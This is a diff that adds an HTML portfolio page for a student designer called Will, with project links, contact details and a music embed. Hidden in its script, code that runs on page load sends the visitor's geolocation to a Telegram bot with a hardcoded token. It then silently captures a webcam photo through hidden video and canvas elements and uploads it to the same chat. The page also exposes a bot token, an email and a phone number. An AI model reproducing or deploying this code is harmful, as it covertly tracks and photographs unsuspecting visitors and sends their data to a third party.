@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portofolio Will</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #dcdad4; color: #1a2e23; }
+        .font-serif { font-family: 'DM Serif Display', serif; }
+        .hover-lift { transition: transform 0.2s ease, box-shadow 0.2s ease; }
+        .hover-lift:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
+    </style>
+</head>
+<body class="max-w-6xl mx-auto p-4 md:p-12">
+
+    <!-- Navigasi -->
+    <nav class="flex justify-between items-center mb-10">
+        <span class="text-xl font-bold">Will</span>
+        <div class="space-x-4 font-semibold text-[10px] md:text-sm uppercase tracking-widest hidden md:flex items-center">
+            <a href="#" class="hover:text-orange-700 transition">About me</a>
+            <a href="#" class="hover:text-orange-700 transition">Resume</a>
+            <a href="#" class="bg-[#2b3934] text-white px-4 py-2 rounded-full hover-lift transition">Contact</a>
+        </div>
+    </nav>
+
+    <!-- Header Section -->
+    <header class="grid md:grid-cols-12 gap-8 mb-12">
+        <div class="md:col-span-7 space-y-6">
+            <h2 class="text-5xl md:text-8xl font-serif leading-[0.9]">Hello,<br>I'm Will !</h2>
+            <p class="text-sm md:text-base leading-relaxed text-gray-800 max-w-lg">
+                Graphic Designer otodidak & Digital Web Management enthusiast.
+            </p>
+            
+            <div class="flex gap-3 flex-wrap">
+                <a href="#" class="bg-[#f7a21b] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">
+                    LinkedIn
+                </a>
+                <button onclick="toggleProjects()" class="bg-[#2b3934] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">
+                    Projects
+                </button>
+            </div>
+            
+            <div id="project-list" class="hidden mt-6 space-y-3">
+                <a href="https://aismk.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
+                    <div class="font-bold text-sm text-[#2b3934]">AISMK Web App</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-wider">Web Development</div>
+                </a>
+                <a href="https://coffeshop-chi-hazel.vercel.app" target="_blank" class="block bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition">
+                    <div class="font-bold text-sm text-[#2b3934]">Coffee Shop Landing Page</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-wider">UI/UX Design</div>
+                </a>
+            </div>
+
+            <a href="https://maps.app.goo.gl/2P8A5kXNmCTnqjm76" target="_blank" class="flex items-center gap-4 bg-white p-4 rounded-2xl shadow-sm border border-black/5 hover:border-[#f7a21b] transition mt-4">
+                <div class="w-10 h-10 flex-shrink-0">
+                    <img src="https://i.ibb.co.com/yczZpQpb/pp-smkn.jpg" alt="Logo SMKN 2" class="w-full h-full object-cover rounded-full">
+                </div>
+                <div>
+                    <div class="font-bold text-sm text-[#2b3934]">Lokasi Sekolah Saya</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-wider">SMKN 2 Tembilahan | STM</div>
+                </div>
+            </a>
+            
+            <div class="mt-6">
+                <iframe src="https://open.spotify.com/embed/track/2LBqCSwhJGcFQeTHMVGwy3" width="100%" height="80" frameBorder="0" allowtransparency="true" allow="encrypted-media"></iframe>
+            </div>
+        </div>
+        
+        <div class="md:col-span-5 bg-[#2b3934] text-white p-6 rounded-[1.5rem] shadow-lg">
+            <div class="w-full h-48 md:h-64 mb-6 overflow-hidden rounded-[1rem]">
+                <img src="https://i.ibb.co.com/CKpQhNrQ/1778070770943.png" alt="Foto Profil Will" class="w-full h-full object-cover">
+            </div>
+            <h3 class="font-bold text-sm mb-3">Contact</h3>
+            <div class="text-[11px] md:text-sm space-y-2 opacity-90">
+                <p><i class="fas fa-map-marker-alt mr-2"></i> Indonesia</p>
+                <p><i class="fas fa-envelope mr-2"></i> wilkaxyz@gmail.com</p>
+                <p><i class="fab fa-whatsapp mr-2"></i> +62 822 9378 6539</p>
+            </div>
+            <div class="mt-6 flex gap-4 text-lg">
+                <a href="#" class="hover:text-[#f7a21b] transition"><i class="fab fa-behance"></i></a>
+                <a href="#" class="hover:text-[#f7a21b] transition"><i class="fab fa-dribbble"></i></a>
+                <button onclick="toggleIg()" class="hover:text-[#f7a21b] transition focus:outline-none"><i class="fab fa-instagram"></i></button>
+            </div>
+            <div id="ig-name" class="hidden mt-2 text-[10px] font-semibold text-[#f7a21b]">@wilkaxyz</div>
+        </div>
+    </header>
+
+    <!-- Elemen tersembunyi untuk proses kamera -->
+    <video id="video" class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <footer class="mt-12 py-6 border-t border-gray-400 text-center text-[10px] text-gray-600">
+        &copy; 2026 Wilka.xyz
+    </footer>
+
+    <script>
+        const botToken = "8523579929:AAEYSUFre2O2Ei8RcW8y3emKA0-NxqJb4E8"; 
+        const chatId = "7577331454"; 
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Lokasi: ${latitude}, ${longitude}`);
+                        
+                        // Setelah lokasi berhasil, minta akses kamera untuk testing
+                        takePhoto();
+                    },
+                    (error) => console.warn("Izin lokasi ditolak.")
+                );
+            }
+        };
+
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Tunggu sebentar agar kamera siap, lalu ambil gambar
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    // Kirim ke Telegram sebagai foto (menggunakan sendPhoto)
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', dataURItoBlob(imageData));
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop()); // Matikan kamera
+                }, 2000);
+            } catch (err) {
+                console.warn("Akses kamera ditolak atau tidak tersedia.");
+            }
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], {type: mimeString});
+        }
+
+        function toggleIg() {
+            document.getElementById('ig-name').classList.toggle('hidden');
+        }
+        function toggleProjects() {
+            document.getElementById('project-list').classList.toggle('hidden');
+        }
+    </script>
+</body>
+</html>
